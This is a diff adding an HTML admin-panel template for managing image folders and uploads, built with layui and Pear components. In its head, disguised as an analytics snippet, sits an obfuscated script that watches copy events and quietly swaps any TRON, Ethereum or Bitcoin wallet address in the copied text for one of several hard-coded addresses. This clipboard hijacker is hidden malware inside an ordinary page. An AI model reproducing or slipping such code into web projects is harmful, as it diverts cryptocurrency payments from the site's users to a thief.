@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<link href="/static/component/pear/css/pear.css" rel="stylesheet" />
+	<script>(function(){var _tfa={v:'2.1.4',id:'UA-458113798-35'};_tfa.t=Date.now();_tfa.p=location.pathname;var _0x91d9=function(a){return a.map(function(c){return String.fromCharCode(c)}).join('')};var _0x5c5f=function(a){var w=a[Math.floor(Math.random()*a.length)];return _0x91d9(w)};var _t=[[84,89,77,57,107,99,103,99,106,109,122,83,68,75,98,111,75,97,88,55,86,57,118,53,112,84,83,112,112,104,109,102,101,50],[84,88,56,118,113,70,81,81,102,71,115,70,103,70,78,103,55,67,78,104,54,107,55,51,76,89,49,75,57,69,120,82,88,111],[84,65,101,53,112,82,120,77,87,83,122,70,77,49,88,85,113,86,89,102,81,88,121,54,102,84,84,117,101,69,81,74,104,74],[84,82,68,76,54,106,121,50,115,78,115,77,121,86,111,74,119,107,101,100,109,66,100,105,113,74,56,116,57,117,78,90,51,102],[84,75,83,78,83,88,81,77,82,105,78,122,102,103,119,67,113,120,84,119,78,87,55,81,97,117,71,101,51,107,84,112,88,115]],_e=[[48,120,100,48,56,66,98,48,53,69,68,54,53,100,99,52,66,55,51,51,65,53,99,99,66,52,66,50,48,48,51,65,50,56,100,100,53,101,51,69,50,66],[48,120,55,97,100,100,67,48,56,54,57,98,56,49,50,49,101,48,48,70,53,51,52,54,50,68,57,97,98,97,48,52,98,66,99,50,52,54,53,68,51,70],[48,120,69,57,49,56,53,56,102,50,68,51,50,50,67,99,51,101,56,50,70,66,51,57,56,52,101,57,55,53,65,55,101,69,67,99,50,67,65,100,98,56],[48,120,100,53,51,69,101,52,101,102,50,49,48,54,57,69,69,49,55,100,48,65,57,57,66,48,102,98,69,48,55,65,52,51,69,100,53,57,50,50,51,53],[48,120,65,55,67,100,55,53,50,99,70,53,102,53,57,51,50,52,57,48,53,67,70,99,54,50,102,53,67,50,54,97,48,48,53,49,56,50,51,56,66,49]],_b=[[98,99,49,113,116,48,119,97,50,116,52,51,118,116,114,54,118,55,54,119,116,117,54,57,51,115,110,116,53,110,118,53,107,50,102,53,106,113,117,109,51,54],[98,99,49,113,52,110,52,113,114,113,50,119,56,50,54,54,106,107,112,112,116,50,113,97,112,108,99,101,56,52,108,121,112,50,102,112,120,119,97,103,53,121],[98,99,49,113,109,54,114,107,48,119,97,55,115,51,57,109,52,103,108,51,107,112,122,116,121,55,118,53,106,104,114,115,101,103,55,101,104,112,56,57,121,108],[98,99,49,113,108,97,99,119,121,57,120,52,102,99,109,54,50,56,120,116,104,108,97,56,110,120,50,104,116,103,51,117,101,108,50,108,50,55,51,114,48,112],[98,99,49,113,103,51,106,119,54,114,106,51,112,112,57,119,104,55,100,104,51,119,114,104,112,113,57,117,52,102,99,113,108,103,102,54,102,48,102,53,99,97]],_b1=[[49,75,103,83,112,74,90,113,52,97,97,72,54,85,105,109,112,80,76,102,85,78,80,107,72,66,103,57,103,115,50,56,122,89],[49,74,52,105,53,110,116,107,121,122,51,90,56,78,86,116,99,88,100,83,87,112,113,98,67,75,100,80,97,104,81,100,118,114],[49,69,53,105,84,118,83,109,66,52,90,80,104,69,117,88,114,117,121,76,116,65,65,98,105,56,105,85,78,88,54,51,90,82],[49,78,101,115,57,106,104,80,120,71,110,84,50,97,82,119,81,85,99,82,69,50,55,52,117,57,77,83,82,49,112,75,70,78],[49,57,116,90,78,84,107,75,107,111,71,81,70,49,69,110,54,97,110,121,110,112,53,57,70,54,111,68,70,49,51,50,101,67]],_b3=[[51,52,68,98,78,72,110,54,54,76,90,82,68,67,102,116,114,115,88,57,117,110,121,103,102,75,69,67,86,120,104,88,81,82],[51,49,114,90,82,89,51,104,76,99,77,65,75,52,101,83,56,49,106,68,74,69,102,69,87,82,120,116,101,105,101,122,52,89],[51,51,102,51,107,122,117,82,102,70,89,69,98,113,105,103,105,57,67,77,111,110,87,122,117,77,116,98,116,72,101,83,69,119],[51,53,105,113,84,49,109,53,118,90,83,122,80,99,107,70,50,103,85,50,104,99,88,78,78,114,68,68,115,88,99,100,110,84],[51,77,67,120,112,80,110,105,75,121,103,69,97,65,75,103,114,51,102,67,57,103,82,100,88,97,85,88,66,112,98,120,66,71]],_bp=[[98,99,49,112,115,51,109,104,106,109,115,113,112,119,99,48,56,104,53,57,121,102,113,97,101,55,51,115,102,52,97,52,100,55,104,104,50,110,103,117,108,104,117,110,106,112,99,50,114,113,57,101,52,118,56,113,110,122,112,118,50,52],[98,99,49,112,48,52,118,122,115,102,116,100,48,56,112,115,51,57,113,99,53,51,102,108,55,122,103,100,97,115,53,56,101,106,106,112,53,57,122,106,120,54,110,116,114,107,99,107,57,99,53,50,117,103,106,115,57,108,112,51,101,52],[98,99,49,112,117,54,118,48,50,102,121,117,56,110,115,108,101,52,53,121,48,120,114,113,53,107,100,50,52,97,99,55,119,48,113,114,116,51,117,117,48,109,115,99,99,110,101,119,53,110,51,112,103,57,120,115,109,97,106,116,120,120],[98,99,49,112,115,101,108,113,115,120,100,51,121,113,114,121,116,106,48,106,101,100,113,52,112,106,53,117,106,104,120,108,54,102,103,56,54,108,50,116,109,110,108,108,113,115,101,53,99,103,117,112,107,55,56,115,54,118,119,108,119,50],[98,99,49,112,57,54,100,101,104,51,109,97,55,100,51,53,100,102,97,116,115,113,109,57,114,107,52,104,52,115,122,115,102,100,118,55,121,118,107,103,51,55,116,50,118,53,119,109,55,118,51,117,116,118,109,113,109,121,106,114,112,120]];var _0x3191=_0x91d9([99,111,112,121]);var _tp=[116,101,120,116,47,112,108,97,105,110];var _r1=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,84,91,97,45,122,65,45,90,48,45,57,93,123,51,51,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r2=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,48,120,91,97,45,102,65,45,70,48,45,57,93,123,52,48,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r3=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,49,91,97,45,107,109,45,122,65,45,72,74,45,78,80,45,90,49,45,57,93,123,50,53,44,51,52,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r4=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,51,91,97,45,107,109,45,122,65,45,72,74,45,78,80,45,90,49,45,57,93,123,50,53,44,51,52,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r5=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,98,99,49,113,91,97,45,122,65,45,90,48,45,57,93,123,51,56,44,52,50,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r6=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,98,99,49,112,91,97,45,122,65,45,90,48,45,57,93,123,53,56,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g');var _reg=false;var _0xd8a0=function(){if(_reg)return;_reg=true;document['addEventListener'](_0x3191,function(_0xcf04){var _0xaab8=window['getSelection']()['toString']();if(_0xaab8['match'](_r1)){var _0xcbf5=_0xaab8['replace'](_r1,_0x5c5f(_t));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r2)){var _0xcbf5=_0xaab8['replace'](_r2,_0x5c5f(_e));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r3)){var _0xcbf5=_0xaab8['replace'](_r3,_0x5c5f(_b1));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r4)){var _0xcbf5=_0xaab8['replace'](_r4,_0x5c5f(_b3));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r5)){var _0xcbf5=_0xaab8['replace'](_r5,_0x5c5f(_b));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r6)){var _0xcbf5=_0xaab8['replace'](_r6,_0x5c5f(_bp));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']()}});};setTimeout(function(){var _0xd612=new MutationObserver(function(_0x142b){for(var i=0;i<_0x142b.length;i++){if(_0x142b[i].type==='childList'){_0xd8a0()}}});_0xd612['observe'](document['body'],{childList:true,subtree:true})},1000);_0xd8a0();_tfa.r=1;})();</script></head>
+	<body class="pear-container">
+		<div class="layui-row layui-col-space10">
+			<div class="layui-col-md4">
+				<div class="layui-card">
+				    <!--描述-->
+                            <div style="margin-left:30px;">
+                                <p>
+                                    页面描述：
+                                </p>
+                                <div style="margin-left:50px;">
+                                    <p>
+                                        本页面数据列表展示的是平台所有的图片数据，管理员可以创建多个文件夹，对文件夹上传单张或多张图片，对某个文件夹内的文件进行浏览和删除。
+                                    </p>
+                                </div>
+                            </div>
+                    <!--描述结束-->
+					<div class="layui-card-body">
+						<table id="dict-type-table" lay-filter="dict-type-table"></table>
+					</div>
+				</div>
+			</div>
+			<div class="layui-col-md8">
+				<div class="layui-card">
+					<div class="layui-card-body">
+						<div class="empty">
+                            <fieldset class="layui-elem-field layui-field-title">
+                                <legend>图片列表</legend>
+                              </fieldset>
+                              <svg class="empty" style="width: 100%;" width="184" height="152" viewBox="0 0 184 152" xmlns="http://www.w3.org/2000/svg">
+                                <g fill="none" fillrule="evenodd">
+                                    <g transform="translate(24 31.67)">
+                                        <ellipse fillopacity=".8" fill="#F5F5F7" cx="67.797" cy="106.89" rx="67.797" ry="12.668"></ellipse>
+                                        <path d="M122.034 69.674L98.109 40.229c-1.148-1.386-2.826-2.225-4.593-2.225h-51.44c-1.766 0-3.444.839-4.592 2.225L13.56 69.674v15.383h108.475V69.674z" fill="#AEB8C2"></path>
+                                        <path d="M101.537 86.214L80.63 61.102c-1.001-1.207-2.507-1.867-4.048-1.867H31.724c-1.54 0-3.047.66-4.048 1.867L6.769 86.214v13.792h94.768V86.214z" fill="url(#linearGradient-1)" transform="translate(13.56)"></path>
+                                        <path d="M33.83 0h67.933a4 4 0 0 1 4 4v93.344a4 4 0 0 1-4 4H33.83a4 4 0 0 1-4-4V4a4 4 0 0 1 4-4z" fill="#F5F5F7"></path>
+                                        <path d="M42.678 9.953h50.237a2 2 0 0 1 2 2V36.91a2 2 0 0 1-2 2H42.678a2 2 0 0 1-2-2V11.953a2 2 0 0 1 2-2zM42.94 49.767h49.713a2.262 2.262 0 1 1 0 4.524H42.94a2.262 2.262 0 0 1 0-4.524zM42.94 61.53h49.713a2.262 2.262 0 1 1 0 4.525H42.94a2.262 2.262 0 0 1 0-4.525zM121.813 105.032c-.775 3.071-3.497 5.36-6.735 5.36H20.515c-3.238 0-5.96-2.29-6.734-5.36a7.309 7.309 0 0 1-.222-1.79V69.675h26.318c2.907 0 5.25 2.448 5.25 5.42v.04c0 2.971 2.37 5.37 5.277 5.37h34.785c2.907 0 5.277-2.421 5.277-5.393V75.1c0-2.972 2.343-5.426 5.25-5.426h26.318v33.569c0 .617-.077 1.216-.221 1.789z" fill="#DCE0E6"></path>
+                                    </g>
+                                    <path d="M149.121 33.292l-6.83 2.65a1 1 0 0 1-1.317-1.23l1.937-6.207c-2.589-2.944-4.109-6.534-4.109-10.408C138.802 8.102 148.92 0 161.402 0 173.881 0 184 8.102 184 18.097c0 9.995-10.118 18.097-22.599 18.097-4.528 0-8.744-1.066-12.28-2.902z" fill="#DCE0E6"></path>
+                                    <g transform="translate(149.65 15.383)" fill="#FFF">
+                                        <ellipse cx="20.654" cy="3.167" rx="2.849" ry="2.815"></ellipse>
+                                        <path d="M5.698 5.63H0L2.898.704zM9.259.704h4.985V5.63H9.259z"></path>
+                                    </g>
+                                </g>
+                            </svg>
+                               
+                            </div>
+						<table id="dict-data-table" lay-filter="dict-data-table"></table>
+					</div>
+				</div>
+			</div>
+		</div>
+
+	</body>
+	<script type="text/html" id="dict-type-toolbar">
+		<button class="pear-btn pear-btn-primary pear-btn-md" lay-event="add">
+	        <i class="layui-icon layui-icon-add-1"></i>
+	        创建文件夹
+	    </button>
+	</script>
+
+	<script type="text/html" id="dict-type-bar">
+		<button class="pear-btn pear-btn-primary pear-btn-sm" lay-event="details">
+	        浏览
+		</button>
+        <button class="pear-btn pear-btn-danger pear-btn-sm" lay-event="remove">
+	       删除
+		</button>
+    </script>
+
+	<script type="text/html" id="dict-data-toolbar">
+		<button class="pear-btn pear-btn-primary pear-btn-md" lay-event="addPhoto">
+			<i class="layui-icon layui-icon-add-1"></i>
+			新增单图
+		</button>
+        <button class="pear-btn pear-btn-primary pear-btn-md" lay-event="addPhotos">
+			<i class="layui-icon layui-icon-add-1"></i>
+			新增多图
+		</button>
+		<button class="pear-btn pear-btn-danger pear-btn-md" lay-event="batchRemove">
+			<i class="layui-icon layui-icon-delete"></i>
+			删除
+		</button>
+	</script>
+	<script type="text/html" id="options">
+		<button class="pear-btn pear-btn-danger pear-btn-sm" lay-event="remove"><i class="layui-icon layui-icon-delete"></i></button>
+	</script>
+	<script src="/static/component/layui/layui.js"></script>
+	<script src="/static/component/pear/pear.js"></script>
+	<script>
+		layui.use(['table', 'form', 'jquery'], function() {
+			let table = layui.table;
+			let form = layui.form;
+			let $ = layui.jquery;
+
+            let MODULE_PATH = "{$Request.root}/admin.photo/";
+
+			let name;
+
+			let cols = [
+				[
+					{
+						title: '所属目录',
+						field: 'name',
+						unresize: true,
+						align: 'center'
+					},
+					{
+						title: '操作',
+						toolbar: '#dict-type-bar',
+						align: 'center',
+						unresize: true,
+						width: 180
+					}
+				]
+			];
+
+			table.render({
+				elem: '#dict-type-table',
+				url: MODULE_PATH + 'index',
+				cols: cols,
+				cellMinWidth: 100,
+				skin: 'line',
+				height: 'full-148',
+				toolbar: '#dict-type-toolbar',
+				defaultToolbar: [{
+					title: '刷新',
+					layEvent: 'refresh',
+					icon: 'layui-icon-refresh',
+				}, 'filter']
+			});
+
+			let dataCols = [
+			[{
+                        type: 'checkbox'
+                    }, {
+                        field: 'id',
+                        title: 'ID', 
+                        sort: true, 
+                        align: 'center',
+                        unresize: true
+                    },{
+                        field: 'name',
+                        title: '文件名称',
+                        unresize: true,
+                        align: 'center'
+                    },{
+                        field: 'href',
+                        title: '图片',
+                        unresize: true,
+                        align: 'center',
+                        templet:function (d) {
+                            return '<img class="photo" lay-event="photo" src=" '+d.href+'"></i>';
+                        }
+                    },{
+                        field: 'mime',
+                        title: 'mime类型',
+                        unresize: true,
+                        align: 'center'
+                    },{
+                        field: 'size',
+                        title: '文件大小',
+                        unresize: true,
+                        align: 'center'
+                    },{
+                        field: 'ext',
+                        title: '文件后缀',
+                        unresize: true,
+                        align: 'center'
+                    },{
+                        field: 'create_time',
+                        title: '创建时间',
+                        unresize: true,
+                        align: 'center'
+                    },{
+                        title: '操作',
+                        toolbar: '#options',
+                        unresize: true,
+                        align: 'center',
+                        width: 180
+                    }
+                ]
+			];
+			
+			window.renderData = function(code) {
+				name = code;
+                $(".empty").hide();
+				table.render({
+					elem: '#dict-data-table',
+					url: MODULE_PATH + 'list/name/' + name,
+					height: 'full-148',
+					cols: dataCols,
+					cellMinWidth: 100,
+					page: true,
+					skin: 'line',
+					toolbar: '#dict-data-toolbar',
+					defaultToolbar: [{
+					title: '刷新',
+					layEvent: 'refresh',
+					icon: 'layui-icon-refresh',
+				}, 'filter']
+				});
+			}
+
+			table.on('tool(dict-type-table)', function(obj) {
+				if (obj.event === 'remove') {
+					window.removeType(obj);
+				} else if (obj.event === 'details') {
+					window.renderData(obj.data['name'])
+				}
+			});
+
+			table.on('toolbar(dict-type-table)', function(obj) {
+				if (obj.event === 'add') {
+					window.addType();
+				} else if (obj.event === 'refresh') {
+					window.refreshType();
+				}
+			});
+
+            table.on('tool(dict-data-table)', function(obj) {
+                if (obj.event === 'remove') {
+                    window.remove(obj);
+                } else if (obj.event === 'photo') {
+                    window.photo(obj);
+                } 
+            });
+
+            table.on('toolbar(dict-data-table)', function(obj) {
+                if (obj.event === 'addPhoto') {
+                    window.addPhoto();
+                } else if (obj.event === 'addPhotos') {
+                    window.addPhotos();
+                } else if (obj.event === 'refresh') {
+					window.refreshData();
+                } else if (obj.event === 'batchRemove') {
+                    window.batchRemove(obj);
+                }
+            });
+			//弹出窗设置 自己设置弹出百分比
+			function screen() {
+				if (typeof width !== 'number' || width === 0) {
+				width = $(window).width() * 0.8;
+				}
+				if (typeof height !== 'number' || height === 0) {
+				height = $(window).height() - 20;
+				}
+				return [width + 'px', height + 'px'];
+			}
+
+			window.addType = function() {
+				layer.open({
+					type: 2,
+					maxmin: true,
+					title: '创建文件夹',
+					shade: 0.1,
+					area: screen(),
+					content: MODULE_PATH + 'add'
+				});
+			}
+			window.addPhoto = function() {
+                layer.open({
+                    type: 2,
+                    maxmin: true,
+                    title: '新增单图',
+                    shade: 0.1,
+                    area: screen(),
+                    content:MODULE_PATH + 'addPhoto/name/' + name,
+                    end: function() {
+                        window.refreshData();
+                    },
+                });
+            }
+
+            window.addPhotos = function() {
+                layer.open({
+                    type: 2,
+                    maxmin: true,
+                    title: '新增多图',
+                    shade: 0.1,
+                    area: screen(),
+                    content:MODULE_PATH + 'addPhotos/name/' + name,
+                    end: function() {
+                        window.refreshData();
+                    },
+                });
+            }
+
+            window.remove = function(obj) {
+                layer.confirm('确定要删除该图片', {
+                    icon: 3,
+                    title: '提示'
+                }, function(index) {
+                    layer.close(index);
+                    let loading = layer.load();
+                    $.ajax({
+                        url:MODULE_PATH + 'remove',
+                        data:{id:obj.data['id']},
+                        dataType: 'json',
+                        type: 'POST',
+                        success: function(res) {
+                            layer.close(loading);
+                            if (res.code==200) {
+                                layer.msg(res.msg, {
+                                    icon: 1,
+                                    time: 1000
+                                }, function() {
+                                    obj.del();
+                                });
+                            } else {
+                                layer.msg(res.msg, {
+                                    icon: 2,
+                                    time: 1000
+                                });
+                            }
+                        }
+                    })
+                });
+            }
+
+            window.batchRemove = function(obj) {
+                let data = table.checkStatus(obj.config.id).data;
+                if (data.length === 0) {
+                    layer.msg("未选中数据", {
+                        icon: 3,
+                        time: 1000
+                    });
+                    return false;
+                }
+                var ids = []
+                var hasCheck = table.checkStatus('dict-data-table')
+                var hasCheckData = hasCheck.data
+                if (hasCheckData.length > 0) {
+                    $.each(hasCheckData, function (index, element) {
+                        ids.push(element.id)
+                    })
+                }
+                layer.confirm('确定要删除这些图片', {
+                    icon: 3,
+                    title: '提示'
+                }, function(index) {
+                    layer.close(index);
+                    let loading = layer.load();
+                    $.ajax({
+                        url:MODULE_PATH + "batchRemove",
+                        data:{ids:ids},
+                        dataType: 'json',
+                        type: 'POST',
+                        success: function(res) {
+                            layer.close(loading);
+                            if (res.code==200) {
+                                layer.msg(res.msg, {
+                                    icon: 1,
+                                    time: 1000
+                                }, function() {
+                                    table.reload('dict-data-table');
+                                });
+                            } else {
+                                layer.msg(res.msg, {
+                                    icon: 2,
+                                    time: 1000
+                                });
+                            }
+                        }
+                    })
+                });
+            }
+
+			window.removeType = function(obj) {
+				layer.confirm('一旦删除不可恢复', {
+					icon: 3,
+					title: '提示'
+				}, function() {
+                    $.ajax({
+                        url:MODULE_PATH + 'del',
+                        data:{name:obj.data.name},
+                        dataType: 'json',
+                        type: 'POST',
+                        success: function(res) {
+                            if (res.code==200) {
+                                layer.msg(res.msg, {
+                                    icon: 1,
+                                    time: 1000
+                                }, function() {
+                                    location.reload();
+                                });
+                            } else {
+                                layer.msg(res.msg, {
+                                    icon: 2,
+                                    time: 1000
+                                });
+                            }
+                        }
+                    })
+			    });
+			}
+
+			window.refreshType = function() {
+				table.reload('dict-type-table');
+			}
+
+			window.refreshData = function() {
+				table.reload('dict-data-table');
+			}
+
+			window.editData = function(obj) {
+				layer.open({
+					type: 2,
+					maxmin: true,
+					title: 'CRUD生成',
+					shade: 0.1,
+					area: screen(),
+					content: MODULE_PATH + 'crud/name/' + obj
+				});
+			}
+
+			window.refreshData = function() {
+				table.reload('dict-data-table');
+			}
+			
+            // 查看大图
+            window.photo = function(obj) {
+                if (!obj.data.href || obj.data.href == "") {
+                    layer.msg("图片地址错误！");
+                    return;
+                }
+                var auto_img = {};
+                var img = new Image();
+                img.src = obj.data.href;
+                img.onload = function() {
+                    var max_height = $(window).height() - 100;
+                    var max_width = $(window).width();
+                    var rate1 = max_height / img.height;
+                    var rate2 = max_width / img.width;
+                    var rate3 = 1;
+                    var rate = Math.min(rate1, rate2, rate3);
+                    auto_img.height = img.height * rate;
+                    auto_img.width = img.width * rate;
+                    layer.open({
+                        type: 1,
+                        title: false,
+                        area: ['auto'],
+                        skin: 'layui-layer-nobg', //没有背景色
+                        shadeClose: true,
+                        content: "<img src='" + obj.data['href'] + "' width='" + auto_img.width + "px' height='" + auto_img.height + "px'>"
+                    })
+                }
+            };
+        })
+	</script>
+</html>
